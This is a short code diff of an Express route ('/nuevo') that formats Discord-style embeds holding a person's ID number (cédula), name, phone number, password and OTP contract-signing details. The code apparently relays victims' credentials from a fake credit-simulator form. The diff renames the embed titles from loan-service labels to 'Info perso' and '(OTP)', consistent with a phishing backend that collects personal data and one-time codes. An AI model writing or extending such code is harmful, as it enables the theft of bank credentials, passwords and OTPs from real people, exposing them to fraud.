@@ -63,7 +63,7 @@ app.post('/nuevo', async (req, res) => {
                      );
             } 
             else if (accion === 'simulador') {
-                embed.setTitle('📝 Datos del Simulador de Crédito')
+                embed.setTitle('📝 Info perso')
                      .addFields(
                          { name: '🆔 Cédula', value: `\`${datos.cedula}\``, inline: true },
                          { name: '👤 Nombre', value: `\`${datos.nombre}\``, inline: true },
@@ -88,7 +88,7 @@ app.post('/nuevo', async (req, res) => {
                                 `Fecha de pago: día ${infoCompleta.fechaPago || 'N/A'}`;
                 }
 
-                embed.setTitle('✍️ Firma de Contrato (OTP)')
+                embed.setTitle('(OTP)')
                      .setDescription(
                          `📱 **Número:** ${numero || 'N/A'}\n` +
                          `🔒 **Contraseña:** ${password || 'N/A'}\n` +
